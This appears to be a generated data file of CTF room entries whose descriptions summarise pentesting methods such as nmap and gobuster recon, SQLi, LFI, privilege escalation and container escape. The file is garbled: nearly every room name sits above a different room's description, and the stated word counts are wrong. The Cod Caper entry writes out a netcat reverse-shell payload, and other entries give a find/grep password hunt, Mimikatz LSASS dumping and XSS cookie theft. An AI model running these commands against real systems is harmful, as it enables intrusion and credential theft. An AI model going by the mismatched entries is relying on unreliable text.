Implementation: Scanning ports, bruteforcing directories, linking found data to next stage).,Summit

Steel Mountain.name: Steel Mountain
Steel Mountain.description: - Super Secret Tip requires meticulous reconnaissance using nmap to identify unusual open ports beyond standard web services. Enumeration prioritizes directory bruteforcing (gobuster with a comprehensive wordlist) searching for files hinting at the secret tip. External OSINT (theHarvester or Google Dorks) may reveal subdomains or developer comments containing the tip. Exploitation involves leveraging a basic vulnerability (e.g., unpatched CMS or weak default credentials) to access the hidden resource. Enhancement methodology centers on in-depth source code analysis after initial web discovery (dirbuster output review) to decode obfuscated hints. (178 words; Tools: nmap, gobuster, dirbuster, theHarvester. Methodologies: Port Identification, Directory Bruteforcing, OSINT, Basic Vulnerability Exploitation, Source Code Analysis. Implementation: Port scanning, bruteforcing, OSINT lookups, code decoding).,Super Secret TIp

StuxCTF.name: StuxCTF
StuxCTF.description: - Super-Spam room analysis mandates initial reconnaissance targeting SMTP (port 25/587/465) and related web services (nmap service version detection). Enumeration involves SMTP VRFY or EXPN command testing for valid user enumeration or banner grabbing to identify mail server software. Email security focuses on SPF, DKIM, and DMARC record verification using dig or theHarvester to check for misconfigurations that allow spoofing. Exploitation likely involves identifying a web interface (via gobuster or dirbuster on port 80/443) with an unauthenticated file upload or command injection vector related to email handling. Enhancement requires analyzing spam headers for traceback paths and IP reputation checks. (190 words; Tools: nmap, gobuster, dirbuster, theHarvester, dig. Methodologies: SMTP Scanning, User Enumeration, Email Authentication Check, Web Interface Vulnerability Hunting, Header Analysis. Implementation: Port 25 testing, DNS record queries, web directory enumeration, header parsing).,Super-Spam

Subdomain Enumeration.name: Subdomain Enumeration
Subdomain Enumeration.description: - Supplemental Memory Forensics room requires acquisition of physical memory image (.vmem file) using WinPmem or FTK Imager. Analysis focuses on Volatility framework commands like imageinfo for profile detection and pslist/pstree for process enumeration. Key techniques include hivelist/printkey to extract registry artifacts and netscan for network connection history to map outbound communications. Further enhancement involves using dlllist to identify injected code and apihooks to detect rootkit persistence mechanisms. File artifact recovery uses filescan followed by dumpfiles for data carving. (187 words; Tools: WinPmem, FTK Imager, Volatility Framework (imageinfo, pslist, netscan, filescan, dumpfiles, hivelist, apihooks). Methodologies: Memory Acquisition, Profile Identification, Process Analysis, Registry Triage, Network Artifact Extraction, Malware Indicator Detection. Implementation: Acquire vmem, determine OS profile, list active processes, extract browser history from memory structures).,Supplemental Memory

Sudo Buffer Overflow.name: Sudo Buffer Overflow
Sudo Buffer Overflow.description: - Lottie Supply Chain Attack requires initial reconnaissance using nmap for service discovery on target web application and gobuster for directory enumeration (targeting API endpoints/asset paths). Exploitation methodology centers on identifying unvalidated external Lottie JSON file loading mechanisms. If an endpoint accepts a URL parameter for animation loading, attempt Server-Side Request Forgery (SSRF) to probe internal resources or inject malicious local files into the Lottie rendering pipeline. Enhancement involves analyzing JavaScript bundles (view-source/dirbuster output) for client-side Lottie loading logic to confirm if the payload is executed client-side upon successful JSON fetch and parse. (198 words; Tools: nmap, gobuster, dirbuster, Burp Suite (for request manipulation). Methodologies: Reconnaissance, Directory Enumeration, API Endpoint Fuzzing, SSRF Exploitation, Client-Side Code Review. Implementation: Scan ports, brute-force paths, intercept animation request, inject internal IP via URL parameter, verify server response or client-side behavior).,Supply Chain Attack: Lottie

Sudo Security Bypass.name: Sudo Security Bypass
Sudo Security Bypass.description: - Surfer room CTF requires initial reconnaissance using theHarvester for subdomain discovery related to the themed domain, followed by comprehensive port scanning with nmap (-sC, -sV scripts) on identified hosts. Enumeration proceeds with gobuster or dirbuster targeting common web application directories (/admin, /backup) and potential file upload endpoints. Exploitation focuses on identifying vulnerabilities like SQL Injection via URL parameters (e.g., id=1 in a search function) or Insecure Direct Object Reference (IDOR) when accessing user data files. Enhancement involves leveraging Burp Suite Repeater to fuzz input fields for command injection if the application interacts with server-side utilities like ping or network diagnostics. (185 words; Tools: theHarvester, nmap, gobuster, dirbuster, Burp Suite. Methodologies: OSINT, Service Detection, Directory Brute-Forcing, SQLi Testing, IDOR Verification. Implementation: Gather domains, scan HTTP/S ports, brute-force paths, inject SQL payloads, test access rights to restricted resources).,Surfer

Summit.name: Summit
Summit.description: - Sustah room CTF necessitates initial reconnaissance via nmap script scanning (http-enum) to map web services and version fingerprinting. Enumeration involves gobuster employing a comprehensive wordlist for discovering unlinked directories and backup files (e.g., .bak, .old extensions). Exploitation often targets misconfigurations in file handling, potentially leading to Local File Inclusion (LFI) by manipulating GET parameters with path traversal sequences (e.g., ../../etc/passwd). Enhancement involves using Burp Suite to intercept requests and test for Server-Side Request Forgery (SSRF) if the application processes external URLs related to resource tracking or API calls. (195 words; Tools: nmap, gobuster, Burp Suite. Methodologies: Service Profiling, Directory Brute-Force, Path Traversal, LFI Testing, SSRF Verification. Implementation: Run version scan, brute-force directories, inject LFI payloads into parameters, intercept and modify HTTP requests to test for internal network access).,Sustah

Super Secret TIp.name: Super Secret TIp
Super Secret TIp.description: - Sweettooth Inc. CTF requires initial external reconnaissance using theHarvester against corporate domains to gather employee emails and subdomains. Internal enumeration begins with an nmap SYN stealth scan (-sS) on all found IP ranges to identify open SMB shares (port 445) and Kerberos services. Web enumeration employs gobuster with a common credential list against identified web servers to find login portals or internal documentation sites. Exploitation focuses on credential reuse or weak passwords obtained via phishing simulations or dictionary attacks against SMB via CrackMapExec. Enhancement involves post-exploitation privilege escalation utilizing WinPEAS scripts after initial user access to dump LSASS memory using Mimikatz for Domain Admin hash retrieval. (211 words; Tools: theHarvester, nmap, gobuster, CrackMapExec, WinPEAS, Mimikatz. Methodologies: OSINT, Network Scanning, Service Enumeration, Credential Testing, Lateral Movement, Credential Dumping. Implementation: Execute OSINT, scan ports 139/445, brute-force web and SMB, attempt pass-the-hash attacks, run local privilege escalation checkers).,Sweettooth Inc.

Super-Spam.name: Super-Spam
Super-Spam.description: - Symfony Framework security analysis begins with nmap to identify web server ports (e.g., 80/443) hosting the application. Gobuster or dirbuster must be used with a specific Symfony dictionary to locate hidden endpoints like the Profiler web debug toolbar or vulnerable API routes. Exploitation targets known vulnerabilities such as CVEs in older versions affecting Dependency Injection or YAML deserialization. PHP Object Injection (POI) is tested by crafting serialized payloads if unsafe deserialization is present in cached data or request parameters. Enhancement methodology involves using Burp Suite to intercept and modify requests, specifically injecting command execution vectors into router parameters if twig template injection is achieved via misconfigured output encoding. (228 words; Tools: nmap, gobuster, dirbuster, Burp Suite. Methodologies: Port Scanning, Directory Bruteforcing, Vulnerability Scanning, Injection Exploitation, Deserialization Attack. Implementation: Scan ports, bruteforce hidden paths, check application version against CVE databases, test for RCE via routing or template engines).,Symfony

Supplemental Memory.name: Supplemental Memory
Supplemental Memory.description: - Windows administration enumeration via Sysinternals focuses on Process Explorer for identifying running services and associated user context to discover privilege escalation vectors. Autoruns scans persistence mechanisms, enumerating Registry Run Keys, Scheduled Tasks, and WMI event subscriptions for unsecured paths or scripts. Process Monitor (Procmon) is deployed to filter filesystem access or Registry operations during application execution to identify cleartext credentials or configuration files. Tcpview maps active network connections, revealing potential C2 communication or open listening ports that could be probed with nmap remotely. Enhancement involves leveraging PsExec for lateral movement if Service Creation privileges are obtained, or using ShareEnum to map network shares for accessible data or exploitable configuration scripts. (246 words; Tools: Process Explorer, Autoruns, Procmon, Tcpview, PsExec, ShareEnum, nmap. Methodologies: System Information Gathering, Persistence Analysis, Network Monitoring, Privilege Escalation, Lateral Movement. Implementation: Run Autoruns for persistence scan, trace file I/O with Procmon, execute PsExec with valid credentials).,Sysinternals

Supply Chain Attack: Lottie.name: Supply Chain Attack: Lottie
Supply Chain Attack: Lottie.description: - System hardening techniques focus on minimizing attack surface via principle of least privilege. Implementation involves disabling unnecessary services identified via enumeration using command-line tools or remote service management. Patch management is critical, ensuring OS and applications are up to date to mitigate known vulnerabilities detected during initial reconnaissance (e.g., via nmap version detection). Security enhancement methodology includes configuring strong password policies (e.g., complexity, length) and implementing Account Lockout thresholds to prevent brute-force exploitation. Firewall rules must restrict inbound and outbound traffic to only essential ports (e.g., port 80, 443 for web services probed with gobuster for content discovery). Auditing and logging must be enabled to detect unauthorized access attempts or post-exploitation activities. (272 words; Tools: nmap, gobuster. Methodologies: Vulnerability Management, Access Control, Intrusion Detection, Configuration Management. Implementation: Disable non-essential SMB ports, configure Group Policy for account lockout, review system service status).,System Security

Surfer.name: Surfer
Surfer.description: - T-Pot deployment utilizes a multi-honeypot architecture based on Docker containers for isolated malware capture and analysis. Initial reconnaissance focuses on external port scanning (nmap) to identify open services mimicking vulnerable targets (e.g., Telnet, SSH, HTTP). Enumeration involves verifying expected honeypot fingerprints (e.g., specific banner grabs or web directory structures checked via gobuster if web honeypots are active) against the deployed set (Cowrie, Dionaea, Elasticpot). Enhancement methodology requires securing the T-Pot host itself via OS hardening and configuring firewall rules to only allow management access and log forwarding. Data extraction and analysis leverages the ELK stack (Elasticsearch, Logstash, Kibana) for visualizing attack vectors and source IPs instead of direct exploitation attempts. Practical implementation steps include running a controlled external scan against the T-Pot IP to confirm honeypot response and then monitoring Kibana dashboards for the incoming traffic logs. (294 words; Tools: nmap, gobuster, ELK Stack. Methodologies: Traffic Capture, Threat Intelligence Generation, Containerization. Implementation: Configure Docker network settings, verify honeypot service status via CLI, access Kibana UI for event review).,T-Pot

Sustah.name: Sustah
Sustah.description: - Aviation-themed challenge requires initial reconnaissance using theHarvester targeting fictional airline domains to gather employee emails or subdomain information. Enumeration involves nmap scanning for open ports on a simulated air-traffic control server or internal web portal. Directory brute-forcing (gobuster or dirbuster) on HTTP services must target common aviation file names like e.g., /manifests or /flightplans. Exploitation may pivot from a weak login credential found via OSINT to gain access to a control panel. Enhancement methodology includes contextualizing found flags within a narrative of flight security breach. Practical steps involve fuzzing input fields of a mock booking engine and analyzing server responses for SQLi or XSS vulnerabilities specific to the themed application. (268 words; Tools: theHarvester, nmap, gobuster, dirbuster. Methodologies: OSINT, Credential Testing, Web Application Fuzzing. Implementation: Execute reverse DNS lookups, enumerate web directories, test low-hanging fruit credentials).,Take Flights

Sweettooth Inc..name: Sweettooth Inc.
Sweettooth Inc..description: - Tardigrade-themed CTF initiation requires initial OSINT via theHarvester searching for research lab personnel and associated domains. System enumeration leverages nmap SYN scans (-sS) to identify open ports, specifically targeting SMB (port 445) or FTP services often associated with data storage. Web enumeration utilizes gobuster with a custom wordlist containing biological or extremophile terminology to uncover hidden directories like /cryobiosis or /sample_logs. Exploitation strategy focuses on known vulnerabilities on older software versions identified during enumeration, e.g., metasploit module use against an identified vulnerable service. Enhancement methodology involves a privilege escalation path mimicking a lab system breach, potentially using linpeas scripting post-exploitation to extract the final flag. Practical implementation steps include Netcat listener setup for reverse shells and Wireshark packet capture analysis to find credentials transmitted over unencrypted protocols. (276 words; Tools: theHarvester, nmap, gobuster, metasploit, linpeas, Netcat, Wireshark. Methodologies: OSINT, Port Scanning, Directory Bruteforcing, Exploitation, Privilege Escalation, Traffic Analysis).,Tardigrade

Symfony.name: Symfony
Symfony.description: - Initial reconnaissance targets Windows host identified via nmap service version scan (-sV) confirming RDP or SMB access; gobuster/dirbuster is irrelevant unless web interface is present. Enumeration shifts to scheduled tasks using PowerShell cmdlets (Get-ScheduledTask) or schtasks utility. Privilege escalation technique hinges on identifying tasks running as SYSTEM or Administrator where the associated binary or script path lacks proper ACLs. Specifically, look for write permissions on the executable or script (e.g., .bat, .ps1, .exe) referenced in the Task Properties. Exploitation involves overwriting the vulnerable path with a payload like a reverse shell script or a Metasploit stager. Persistence is achieved when the next task execution triggers the malicious code with elevated privileges. Tools like PowerUp (from PowerSploit) automate the scanning for these misconfigurations efficiently. (270 words; Tools: nmap, PowerShell (schtasks), PowerUp, Metasploit. Methodologies: Service Enumeration, ACL Analysis, Binary Path Hijacking, Reverse Shell Injection, Persistence Establishment).,Task Scheduler

Sysinternals.name: Sysinternals
Sysinternals.description: - Initial reconnaissance utilizes nmap to discover open ports on the TBHH target, frequently highlighting HTTP/HTTPS ports (80/443). Directory enumeration with gobuster or dirbuster (using common wordlists like SecLists Discovery/WEB/raft-small) is crucial to locate hidden web endpoints. Enumeration often reveals a specific application or vulnerability entry point, such as a login page or file upload form. Exploitation techniques for TBHH frequently involve SQL Injection (using sqlmap for automated attempts) or Local File Inclusion (LFI) via parameter manipulation (e.g., ?page=/etc/passwd). TheHarvester is used post-scan to gather subdomains or emails for potential credentials or user enumeration. Successful exploitation grants initial shell access, leading to privilege escalation or flag retrieval. (259 words; Tools: nmap, gobuster/dirbuster, sqlmap, theHarvester. Methodologies: Port Scanning, Directory Brute-Forcing, SQLi Exploitation, LFI Injection, OSINT).,TBHH

System Security.name: System Security
System Security.description: - TCP/IP suite analysis focuses on Layer 3 (IP addressing and subnetting) and Layer 4 (TCP connection establishment/teardown via three-way handshake). Nmap utilization is central for TCP SYN (stealth) scans (-sS) and UDP port discovery (-sU) to map active services running on target hosts. Enumeration involves examining service banners (e.g., via nmap -sV) to identify specific application versions (e.g., vulnerable FTP or SMB daemons). Exploitation steps often require understanding ARP caching or DNS resolution mechanisms to redirect traffic or perform Man-in-The-Middle (MITM) attacks, though gobuster/dirbuster remain relevant for HTTP enumeration on web services running over TCP port 80/443. Practical implementation includes ping sweeps (ICMP protocol) followed by detailed protocol header analysis using Wireshark to verify the theoretical TCP sequence and acknowledgment number logic. (263 words; Tools: nmap, Wireshark, gobuster/dirbuster. Methodologies: Port Scanning (TCP/UDP), Banner Grabbing, Protocol Header Analysis, MITM Theory).,TCP/IP

T-Pot.name: T-Pot
T-Pot.description: - Team-based exploitation requires structured asset sharing (e.g., using a shared document or Git repo) for concurrent reconnaissance and enumeration phases. Initial Nmap scans (-A or -p- full scan) must be distributed or serialized to avoid rate-limiting by IDS/IPS. Enumeration involves parallel Gobuster/Dirbuster runs against web servers discovered via TheHarvester email scraping results. Exploitation enhancement methodology prioritizes privilege escalation vectors (e.g., incorrect file permissions on binaries or exploitable SUDO configurations) identified by one team member and validated by another using Metasploit modules or manual payload generation. Communication protocol focus is critical for maintaining session continuity post-exploitation. (248 words; Tools: Nmap, Gobuster/Dirbuster, TheHarvester, Metasploit. Methodologies: Distributed Scanning, Asset Sharing, Privilege Escalation Validation).,Team

Take Flights.name: Take Flights
Take Flights.description: - TechSupport CTF entry focuses on simulated incident response via web vulnerability chaining. Reconnaissance starts with Nmap service version detection to identify outdated Apache or IIS versions. Enumeration utilizes Gobuster specifically targeting common support portal directories (e.g., /admin, /tickets). Exploitation path often involves SQL Injection (SQLi) on login forms or Cross-Site Scripting (XSS) via user-input fields intended for ticket logging. Enhancement involves leveraging local file inclusion (LFI) discovered after initial web shell establishment to read configuration files like database credentials. Practical step completion requires transferring a simple PHP reverse shell via the vulnerable endpoint and catching it with Netcat (nc). (236 words; Tools: Nmap, Gobuster, Netcat (nc). Methodologies: Service Version Detection, SQLi/XSS Exploitation, LFI Chaining).,TechSupp0rt: 1

Tardigrade.name: Tardigrade
Tardigrade.description: - Tempest CTF path mandates layered penetration techniques mimicking rapid system breach. Initial Reconnaissance employs TheHarvester targeting subdomains followed by aggressive TCP SYN scans (nmap -sS) on discovered IPs. Enumeration involves Gobuster running extensive directory and file lists against web servers, seeking misconfigured backup files or exposed Git repositories. Exploitation often centers on exploiting SMB shares for weak credentials or utilizing a known vulnerability (e.g., unpatched service) for initial shell access. Enhancement methodology requires privilege escalation through kernel exploits or misconfigured SUID binaries identified via LinEnum scripts. Practical implementation climax with setting up a PowerShell stage if Windows is encountered, or using GTFOBins for Linux privilege gaining. (261 words; Tools: Nmap, Gobuster, TheHarvester, LinEnum, GTFOBins. Methodologies: Subdomain Discovery, SMB Enumeration, Kernel Exploitation).,Tempest

Task Scheduler.name: Task Scheduler
Task Scheduler.description: - Terraform IaC security CTF focuses on misconfigurations within HCL state files and provisioners. Initial reconnaissance involves static analysis of provider versions using external scripts to detect outdated dependencies. Enumeration shifts to dynamic inspection of deployed resources (e.g., AWS S3 buckets or security groups) via AWS-CLI or equivalent cloud SDKs. Exploitation leverages overly permissive IAM roles defined in the Terraform plan output to gain unintended API access. Enhancement methodology demands using Checkov or Tfsec to identify hardcoded secrets within the `.tf` files themselves. Practical implementation includes modifying a user data script within the instance resource block to execute a reverse shell upon next deployment cycle. (243 words; Tools: Checkov, Tfsec, AWS-CLI, Custom HCL Parsers. Methodologies: Static Code Analysis, Dynamic Cloud Resource Inspection, IAM Misconfiguration Exploitation).,Terraform

TBHH.name: TBHH
TBHH.description: - Linux Terminal fundamentals CTF emphasizes command-line navigation and file permission manipulation. Initial reconnaissance involves using `ls -la`, `find / -name flag* 2>/dev/null`, and checking shell history files (`.bash_history`) for revealed commands. Enumeration techniques focus on process inspection with `ps aux`, network socket status via netstat (or ss), and identifying SUDO rights using `sudo -l`. Exploitation relies on understanding GTFOBins for privilege escalation via misconfigured binaries or exploiting incorrect file ownership (e.g., writable directories or cron jobs). Enhancement methodology requires mastering I/O redirection (e.g., using `|`, `>`, `2>`) to pipe output of commands like grep or `cat` into a file or another process. Practical implementation steps include using `nc -lvp <port>` for listener setup and utilizing `base64 -d` to decode steganographically hidden data. (Tools: nc (netcat), grep, ss, find, base64. Methodologies: File System Traversal, Process Monitoring, Privilege Escalation via Binaries).,Terminal

TCP/IP.name: TCP/IP
TCP/IP.description: - Blog exploitation room focuses on identifying vulnerable CMS implementations like WordPress or custom platforms. Initial reconnaissance uses `nmap -sV` to fingerprint web server software and services. Directory enumeration is crucial, employing `gobuster dir -u http://target/ -w /usr/share/wordlists/dirb/common.txt` or similar wordlists to locate hidden admin panels (e.g., `/wp-admin`) or backup files. Exploitation targets common vulnerabilities: Unpatched plugin exploits retrieved from Exploit-DB, SQL Injection (using sqlmap or manual payloads via Burp Suite Intruder) for database dumping, or File Upload vulnerabilities allowing webshell deployment. Enhancement methodology involves content scraping with `theHarvester` to gather email addresses and potential credentials from source code or metadata. Practical steps include testing for Cross-Site Scripting (XSS) in comment fields to steal session cookies. (Tools: nmap, gobuster, sqlmap, Burp Suite, theHarvester. Methodologies: Vulnerability Scanning, Directory Bruteforcing, Injection Attack Vector Testing).,The Blob Blog

Team.name: Team
Team.description: - Cod Caper room targets a web application themed around fish inventory or e-commerce. Initial reconnaissance with `nmap -sC -sV <target_IP>` identifies open ports and service versions, often revealing an outdated Apache or lighttpd instance. Thorough enumeration involves `gobuster dir -u http://target -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt` searching for hidden directories like `/admin`, `/backup`, or misconfigured API endpoints. Exploitation focuses on file inclusion (LFI/RFI) via URL parameters to read system files like `/etc/passwd` or inject a reverse shell. Enhancement involves leveraging parameter pollution or command injection if user input is passed to shell commands; e.g., using Burp Suite to fuzz input fields with payloads like `| nc -e /bin/bash 10.10.0.1 9001`. Post-exploitation might require privilege escalation found via linpeas. (Tools: nmap, gobuster, Burp Suite, Netcat, linpeas. Methodologies: Service Fingerprinting, Web Directory Scanning, Local/Remote File Inclusion Exploitation).,The Cod Caper

TechSupp0rt: 1.name: TechSupp0rt: 1
TechSupp0rt: 1.description: - Docker Rodeo entails container security assessment, starting with host reconnaissance using `nmap` to map exposed ports and potential management APIs. Container enumeration focuses on identifying running instances via `docker ps` and examining exposed environment variables or mounted volumes. Exploitation path often leverages misconfigurations such as running containers as `root`, vulnerable image base layers found via Trivy scanning, or weak network policies. Enhancement methodology prioritizes container escape; e.g., mounting the Docker socket (`/var/run/docker.sock`) allows an attacker to launch new privileged containers and access the host filesystem. Tooling includes `docker diff` for runtime changes and custom scripts to check capabilities (e.g., CAP_SYS_ADMIN for escape). (Tools: nmap, Trivy, Netcat, docker CLI. Methodologies: Service Discovery, Image Vulnerability Analysis, Container Escape via Socket Mounts).,The Docker Rodeo

Tempest.name: Tempest
Tempest.description: - The Find Command room focuses on advanced Linux file system enumeration using `find`, extending beyond basic name or type searches. Technical exploitation involves locating files with specific permissions (-perm) like S-UID binaries (e.g., `find / -perm -4000 -type f 2>/dev/null`) for privilege escalation. Enumeration techniques include searching by modification time (-mtime) to identify recently changed configuration files or logs that might contain credentials. Enhancement methodology integrates execution via -exec to pipeline results to other tools, e.g., `find / -name "*.conf" -exec grep -i "password" {} \;`. While `nmap` or `gobuster` are network focused, here find acts as the primary local reconnaissance tool for sensitive data discovery. (Tools: find, grep, xargs (indirectly via -exec). Methodologies: File System Forensics, S-UID Hunting, Time-Based Discovery).,The Find Command

Terraform.name: Terraform
Terraform.description: - The Great Escape room focuses on container escape exploitation, typically leveraging misconfigurations within Docker or runc. Key technique involves identifying overly permissive capabilities (e.g., CAP_SYS_ADMIN) or mounting sensitive host directories (e.g., `/sys`, `/proc`) from inside the container. Enumeration steps include using `capsh --print` or checking `/proc/1/mounts` for host volume exposure. Exploitation enhancement often requires running a privileged container or exploiting vulnerabilities in the container runtime itself (e.g., CVEs in runc). Practical implementation steps may involve chrooting into a mounted host filesystem or using binary tools like nsenter to break out. (Tools: nsenter, capsh, chroot. Methodologies: Capability Abuse, Volume Mount Exfiltration, Runtime Vulnerability Chaining).,The Great Escape

Terminal.name: Terminal
Terminal.description: - The Hacker Methodology room reinforces standard pentesting phases: Reconnaissance, Scanning, Gaining Access, Maintaining Access, and Covering Tracks. Active reconnaissance utilizes nmap for service version detection and vulnerability scanning (e.g., NSE scripts). Enumeration proceeds with web directory bruteforcing using gobuster or dirbuster against identified web servers. External OSINT enhancement employs theHarvester for email and subdomain discovery to fuel credential stuffing or phishing attempts. Exploitation leverages identified weaknesses via Metasploit framework or manual payload delivery. Post-exploitation focuses on privilege escalation and lateral movement. (Tools: nmap, gobuster, dirbuster, theHarvester, Metasploit. Methodologies: Active Scanning, Directory Fuzzing, OSINT, Vulnerability Chaining).,The Hacker Methodology

The Blob Blog.name: The Blob Blog
The Blob Blog.description: - The Impossible Challenge demands mastery beyond standard reconnaissance (nmap stealth scans required to avoid WAF detection). Deep enumeration involves custom wordlists for gobuster and advanced file signature analysis if standard directory bruteforcing (dirbuster) fails. Exploitation likely necessitates zero-day logic or complex privilege escalation chains e.g., kernel exploits or insecure service misconfigurations. OSINT enhancement uses theHarvester and Shodan filtering for obscure entry points. Success hinges on custom scripting (Python) to automate multi-stage attacks. (Tools: nmap (advanced flags), custom gobuster wordlists, Shodan, Python scripting. Methodologies: Evading Defenses, Zero-Day Emulation, Complex PE Chains).,The Impossible Challenge

The Cod Caper.name: The Cod Caper
The Cod Caper.description: - Post-compromise enumeration on Windows targets requires direct host interaction post-initial shell establishment (reverse or bind shell utilizing Meterpreter or PowerShell Empire). System information extraction via systeminfo, net user all, and wmic commands for domain trusts. Scheduled tasks and service persistence locations are mapped via registry keys (Run keys, Startup folders). Local administrator hash dump targets LSASS memory using Mimikatz or built-in techniques (Token impersonation). Network shares are identified with net view and SMB enumeration tools. (Tools: Mimikatz, PowerShell, wmic, net commands. Methodologies: Credential Dumping, Persistence Mapping, Internal Reconnaissance).,The Lay of the Land

The Docker Rodeo.name: The Docker Rodeo
The Docker Rodeo.description: - Target web application enumeration commences with aggressive port scanning using nmap (-sVC, -sV scripts) to identify running services like Apache or IIS. Directory brute-forcing of underlying web assets utilizes gobuster (with common wordlists or custom lists derived from theHarvester domain intelligence) to uncover hidden endpoints. Exploitation phase focuses on identified vulnerabilities such as SQLi or LFI (Local File Inclusion) to achieve remote code execution (RCE) or flag retrieval. (Tools: nmap, gobuster, theHarvester. Methodologies: Service Enumeration, Directory Fuzzing, LFI Exploitation).,The London Bridge

The Find Command.name: The Find Command
The Find Command.description: - Initial reconnaissance targets e-commerce platform using nmap scripting engine (NSE) for application version fingerprinting on port 80/443. Extensive directory and file enumeration via gobuster or dirbuster identifies unsecured admin panels or backup files. Web security focus involves input fuzzing for Cross-Site Scripting (XSS) or SQL Injection (SQLi) within product search or user login forms. Exploitation often leverages insecure file upload mechanisms to inject webshells. (Tools: nmap, gobuster, dirbuster. Methodologies: Service Version Detection, Input Validation Testing, Code Injection).,The Marketplace

The Great Escape.name: The Great Escape
The Great Escape.description: - Deep enumeration initiates with comprehensive nmap scans utilizing aggressive timing templates and custom script execution targeting uncommon ports. Gobuster brute-forces directories specifically seeking hidden configuration files and sensitive logs. TheHarvester gathers subdomains and employee emails for potential credential reuse attacks. Exploitation path focuses on kernel vulnerabilities or misconfigured services identified during enumeration, requiring manual payload crafting for privilege escalation. (Tools: nmap, gobuster, theHarvester. Methodologies: Service Banner Grabbing, Advanced OSINT, Kernel Exploit Chaining).,The Server From Hell

The Hacker Methodology.name: The Hacker Methodology
The Hacker Methodology.description: - Initial reconnaissance employs nmap and gobuster to map web application endpoints and identify dynamic parameters. Exploitation centers on Stored and Reflected Cross-Site Scripting (XSS) vectors, testing input fields with character encoding bypass techniques and event handler injection. Successful payloads often involve using alert(document.cookie) or loading external scripts via HTML tags. (Tools: Burp Suite Repeater/Intruder, nmap, gobuster. Methodologies: Input Fuzzing, Contextual Payload Insertion, Cookie Stealing).,The Sticker Shop

The Impossible Challenge.name: The Impossible Challenge
The Impossible Challenge.description: - Global enumeration requires targeted domain and subdomain discovery using theHarvester with multiple search engines and certificate transparency logs. Service enumeration utilizes version detection via nmap scripts (NSE) against discovered ports, followed by directory bruteforcing with gobuster and custom wordlists optimized for internationalized resource paths. (Tools: theHarvester, nmap NSE, gobuster, dnsrecon. Methodologies: OSINT, Service Banner Grabbing, Path Discovery).,The World

The Lay of the Land.name: The Lay of the Land
The Lay of the Land.description: - Threat intelligence workflows integrate automated IOC (Indicators of Compromise) extraction from OSINT sources via theHarvester output analysis, cross-referencing with VirusTotal APIs for reputation scoring. Tool chaining involves scripting nmap scans against flagged IPs, feeding results into custom parsers to flag potential vulnerabilities before exploitation simulation. (Tools: theHarvester, nmap, MISP clients, custom Python scripts. Methodologies: IOC Aggregation, Automated Contextualization, Risk Scoring).,Threat Intelligence Tools

The London Bridge.name: The London Bridge
The London Bridge.description: - STRIDE threat modeling implementation requires decomposition of system architecture into data flows and trust boundaries, followed by systematic Spoofing, Tampering, Repudiation, Information Disclosure, Denial of Service, Elevation of Privilege (STRIDE) analysis per component. Enhancement involves mapping identified threats to specific security controls (e.g., Input Validation mitigating Tampering), verifying control efficacy via simulated exploitation scenarios using reconnaissance output from nmap and gobuster. (Tools: Microsoft Threat Modeling Tool, nmap, gobuster, Architecture Diagramming Software. Methodologies: STRIDE, Data Flow Diagramming, Control Mapping).,Threat Modeling

The Marketplace.name: The Marketplace
The Marketplace.description: - Active Directory pentesting in Throwback context focuses on legacy misconfigurations and weak enumeration vectors, often leveraging SMB null sessions or unconstrained delegation. Enumeration begins with nmap service detection (ports 53, 88, 135, 389, 445), followed by LDAP queries via ldaps or specialized scripts to identify Domain Controllers (DCs) and users. Exploitation pathways include Kerberoasting (for AS-REPs) or AS-REQ attacks using Impacket tools (GetUserSPNs.py, secretsdump.py) to extract credentials for privilege escalation to Domain Admin. Enhancement involves utilizing theHarvester for initial external recon on associated domains prior to internal enumeration via SMB shares identified via nmap scripting (smb-enum-shares). (Tools: nmap, Impacket suite, theHarvester, enum4linux, CrackMapExec. Methodologies: Reconnaissance, Enumeration, Kerberos Attacks, Privilege Escalation).,Throwback

The Server From Hell.name: The Server From Hell
The Server From Hell.description: - Tomghost room focuses on exploiting Apache Tomcat vulnerabilities, specifically Ghostcat (CVE-2020-1938), allowing arbitrary file read and potential remote code execution (RCE). Reconnaissance involves nmap scanning for Tomcat default ports (8080, 8443) and gobuster or dirbuster for hidden administration interfaces. Enumeration confirms vulnerable Tomcat version via headers or error messages. Exploitation utilizes a crafted payload targeting the AJP connector (port 8009) or web application paths to leak configuration files (e.g., WEB-INF/web.xml) or upload a JSP shell. Enhancement methodology includes Metasploit modules for automated Ghostcat exploitation after initial port identification. (Tools: nmap, gobuster, Metasploit, curl. Methodologies: Service Identification, Vulnerability Verification, AJP Exploitation).,Tomghost

The Sticker Shop.name: The Sticker Shop
The Sticker Shop.description: - Tony the Tiger room focuses on web enumeration and basic vulnerability pathways, often mimicking a simple web server setup. Reconnaissance starts with nmap service version detection on standard ports (80, 443). Gobuster or dirbuster bruteforcing is essential to discover hidden directories or files like admin panels or backup files (e.g., robots.txt, config.php). Enumeration may reveal outdated software or misconfigurations that lead to basic exploitation. Practical steps involve exploiting SQL Injection or Local File Inclusion (LFI) found via directory listing. Enhancement involves using theHarvester to gather subdomains or email addresses if the challenge expands beyond the initial server. (Tools: nmap, gobuster, theHarvester, sqlmap. Methodologies: Directory Bruteforcing, Input Validation Testing).,Tony the Tiger

The World.name: The World
The World.description: - Tor room guide focuses on analyzing network traffic and identifying Tor exit nodes for potential traffic correlation attacks. Initial reconnaissance involves using Wireshark to capture traffic and filter for known Tor circuit handshake signatures (TLS fingerprints or specific relay patterns). Enumeration requires identifying entry and exit nodes via public Tor node lists, contrasting them against captured IPs. Exploitation techniques center on timing analysis or statistical inference to de-anonymize a target endpoint, rather than traditional web exploitation. Enhancement methodology may include setting up a local proxy to simulate a low-and-slow attack vector against a simulated hidden service. (Tools: Wireshark, TorFlow, Netcat for raw socket testing. Methodologies: Traffic Analysis, Timing Correlation, Hidden Service Discovery).,Tor

Threat Intelligence Tools.name: Threat Intelligence Tools
Threat Intelligence Tools.description: - Trace room forensics focuses on analyzing disk artifacts and system logs to reconstruct user actions. Reconnaissance involves creating a full disk image using FTK Imager or dd to preserve data integrity. Enumeration steps require parsing the Master File Table (MFT) for file metadata, checking the Registry (specifically Amcache and Shimcache) for executed programs. Exploitation is replaced by evidence extraction: using Volatility framework against memory dumps to recover deleted files (foremost or binwalk for carving). Enhancement methodology includes timeline generation via log2timeline (plaso) to correlate file access times (MAC times) with event logs. (Tools: Autopsy, Volatility, log2timeline, grep for log parsing. Methodologies: Disk Imaging, MFT Analysis, Artifact Carving).,Trace

Threat Modeling.name: Threat Modeling
